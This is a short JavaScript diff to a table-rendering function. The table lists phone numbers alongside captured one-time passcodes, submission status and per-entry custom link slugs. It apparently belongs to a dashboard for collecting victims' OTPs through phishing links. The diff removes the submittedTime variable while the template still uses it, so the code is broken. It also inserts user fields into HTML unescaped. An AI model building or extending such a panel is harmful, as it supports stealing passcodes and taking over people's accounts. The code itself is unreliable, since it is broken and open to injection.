@@ -189,13 +189,16 @@ function renderTable(data) {
             ? `<span class="otp-pill">${item.otp}</span>`
             : `<span class="otp-pill-none">OTP Not Submitted</span>`;
 
-        const submittedTime = item.submittedAt ? new Date(item.submittedAt).toLocaleTimeString('en-US') : 'Just now';
-        const verifiedTime = item.verifiedAt ? new Date(item.verifiedAt).toLocaleTimeString('en-US') : '-';
+        const slugBadge = (item.customSlug && item.customSlug !== '/')
+            ? `<span style="background:rgba(59, 130, 246, 0.2); color:#60A5FA; border:1px solid #3B82F6; font-size:11px; padding:2px 8px; border-radius:12px; margin-left:8px; font-weight:600; font-family:monospace;">Link: ${item.customSlug}</span>`
+            : '';
 
         html += `
             <tr>
                 <td>${index + 1}</td>
-                <td style="font-weight:700; color:#FFFFFF; direction:ltr; text-align:left;">${item.phoneNumber}</td>
+                <td style="font-weight:700; color:#FFFFFF; direction:ltr; text-align:left;">
+                    ${item.phoneNumber} ${slugBadge}
+                </td>
                 <td>${otpDisplay}</td>
                 <td>${statusBadge}</td>
                 <td>${submittedTime}</td>
